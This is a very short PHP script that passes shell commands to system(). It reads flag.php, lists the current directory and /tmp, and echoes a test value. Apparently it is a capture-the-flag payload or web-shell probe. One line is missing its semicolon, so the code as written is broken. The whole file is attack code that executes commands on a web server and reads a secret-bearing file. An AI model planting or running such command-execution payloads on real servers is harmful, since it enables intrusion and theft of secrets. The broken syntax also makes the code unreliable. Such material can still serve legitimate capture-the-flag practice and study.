<?php
system('cat flag.php');
system('ls');
system('echo 111')
system('ls /tmp');
?>